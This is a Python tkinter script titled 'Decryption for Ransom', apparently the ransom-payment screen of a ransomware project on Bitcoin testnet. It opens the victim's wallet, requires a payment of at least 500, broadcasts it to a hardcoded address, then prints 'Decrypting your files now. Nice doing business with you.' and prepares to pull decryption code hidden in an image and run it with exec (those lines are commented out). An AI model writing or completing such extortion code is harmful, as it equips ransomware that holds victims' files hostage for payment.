from tkinter import *
from PIL import Image, ImageTk
from bitcoinlib.wallets import wallet_exists, wallet_create_or_open, wallet_delete
from bitcoinlib.services.services import Service
from extract import extract_file
from bitcoinlib.mnemonic import Mnemonic


def clicking_submit():
    global round

    # Performs the model logic associated with opening a testnet wallet
    if round == 1:
        wallet_name: str = response_entry.get()

        # If user provides input for an existing bitcoin wallet, moves on to next round
        if wallet_exists(wallet_name):
            global wallet
            wallet = wallet_create_or_open(wallet_name,
                                           password=Mnemonic().generate(),
                                           network="testnet")
            print(f"Wallet Name: {wallet_name}")
            print(f"Wallet Address: {wallet.get_key().address}")
            wallet.utxos_update()
            round += 1
            for widget in window.winfo_children():
                if widget != image_label:
                    widget.destroy()
            setup_round_2()
        else:
            wallet_exists_label = Label(window,
                                        text="Wallet not found! Verify the name of your bitcoin wallet.",
                                        fg="red")
            wallet_exists_label.pack(pady=2)

    elif round == 2:
        global amount_to_send
        try:
            for widget in window.winfo_children():
                if widget not in labels_and_entries_2:
                    widget.destroy()
            amount_to_send = float(response_entry_2.get())
            balance = float(wallet.balance())
            print(f"Amount to Send: {amount_to_send}, Wallet Balance: {balance}")

            if amount_to_send < 0:
                warning_label = Label(window,
                                      text="Not a valid transaction...",
                                      fg="red")
                warning_label.pack(pady=2)
                return

            elif amount_to_send > balance:
                warning_label = Label(window, text="Insufficient funds! Add more testnet BTC.", fg="red")
                warning_label.pack(pady=2)
                print("Insufficient funds! Add more testnet BTC.")
                return
            elif amount_to_send >= 500:
                success_label = Label(window, text="Transaction valid! Proceeding...", fg="green")
                success_label.pack(pady=2)
                print("Transaction valid! Proceeding...")

                round += 1
                setup_round_3()
            else:
                warning_label = Label(window, text="Invalid. Not enough to satisfy our terms!", fg="red")
                warning_label.pack(pady=2)
                print("Invalid. Not enough to satisfy our terms!")
                return
        except ValueError:
            warning_label = Label(window, text="Enter a valid amount.", fg="red")
            warning_label.pack(pady=2)


def setup_round_1():
    global response_entry, labels_and_entries_1

    name_label = Label(window, text="Name of Your Bitcoin Wallet", font=('Arial', 10, 'bold'))
    name_label.pack(pady=2)
    response_entry = Entry(window, width=30)
    response_entry.pack(pady=5)
    global submit_button
    submit_button = Button(window, text="Submit", command=clicking_submit, pady=4, borderwidth=2)
    submit_button.pack()

    labels_and_entries_1 = [name_label, response_entry, submit_button]


def setup_round_2():
    global response_entry_2, labels_and_entries_2
    wallet_address_label = Label(window, text=f"Your testnet wallet address: {wallet.get_key().address}",
                                 font=('Arial', 10, 'bold'))
    wallet_address_label.pack(pady=2)

    wallet_balance_label = Label(window,
                                 text=f"Current Balance: {wallet.balance()} tBTC",
                                 font=('Arial', 10, 'bold'),
                                 fg="green")
    wallet_balance_label.pack(pady=2)

    amount_bitcoin_to_send_label = Label(window,
                                         text="Enter the Amount of Bitcoins to Send",
                                         font=('Arial', 10, 'bold'))
    amount_bitcoin_to_send_label.pack(pady=2)

    response_entry_2 = Entry(window, width=30)
    response_entry_2.pack(pady=5)

    submit_button = Button(window,
                           text="Submit",
                           command=clicking_submit,
                           pady=4,
                           borderwidth=2)
    submit_button.pack()

    labels_and_entries_2 = [wallet_address_label, wallet_balance_label, amount_bitcoin_to_send_label, response_entry_2,
                            submit_button, image_label]


def setup_round_3():
    # TODO: Input a wallet to send to...
    receiver_address: str = "tb1qdv4lg0n06tqxf7fh3ptlh7cx6azw5f5rddupls"
    # Updates unspent outputs to limit the occurrence of an error occurring
    wallet.utxos_update()
    try:
        # Attempts to create and send transaction to testnet network
        wallet_transaction = wallet.send_to(receiver_address,
                                            amount_to_send,
                                            network="testnet",
                                            broadcast=True)
        service = Service(network="testnet")
        transaction_details = service.gettransaction(wallet_transaction.txid)

        # Runs when the transaction was not found or failed
        if not transaction_details:
            raise Exception("Transaction details could not be retrieved.")

        # Else, transaction was successful
        else:
            print(f"Transaction retrieved successfully: {transaction_details}")
            print(f"Transaction successful! Sent {amount_to_send} tBTC to {receiver_address}")

            transaction_details_label = Label(text="Transaction successful", fg="blue")
            transaction_details_label.pack()

            successful_transaction_label = Label(
                text="Decrypting your files now. Nice doing business with you. :)",
                fg="green")
            successful_transaction_label.pack()

            decryption(transaction_details)
    except Exception as e:
        print(f"Failed to retrieve transaction details: {e}")


def decryption(transaction_details):
    import os
    # Extracts the key from a specified image
    with open("passphrase.txt", "r") as file:
        lines = file.readlines()
        passphrase = lines[0].strip("\n")
    with open("images.txt", "r") as file:
        lines = file.readlines()
        image_containing_decryption_code: str = lines[3].strip("\n")

    try:
        decryption_code_found: bool = os.path.exists(image_containing_decryption_code)
        if decryption_code_found:
            print(transaction_details.outputs)
            print(transaction_details.info)
            pass
            #code_to_decrypt_files: str = extract_file(image_containing_decryption_code, passphrase)
            #exec("import decrypt")
            #exec(f"{code_to_decrypt_files}")
            #print(f"\nTransaction Details: {transaction_details}")
        else:
            raise FileNotFoundError(
                f"The image name/path {image_containing_decryption_code} doesn't exist in the current directory."
                f"Either the name fed to the variable in the code to be updated or the image "
                f"specified just doesn't exist.")
    except FileNotFoundError as fnfe:
        print(f"File Not Found: {fnfe}")
        return


# Main Window Setup
window = Tk()
window.title("Decryption for Ransom")
image = Image.open("Popup.png")
resized_image = image.resize((673, 383))
photo = ImageTk.PhotoImage(resized_image)
image_label = Label(window, image=photo)
image_label.pack()
window.geometry("675x550")

icon_image = ImageTk.PhotoImage(file="icon.png")
window.iconphoto(False, icon_image)

# Initializes the round and displays widgets for first window frame
round = 1
setup_round_1()

window.mainloop()
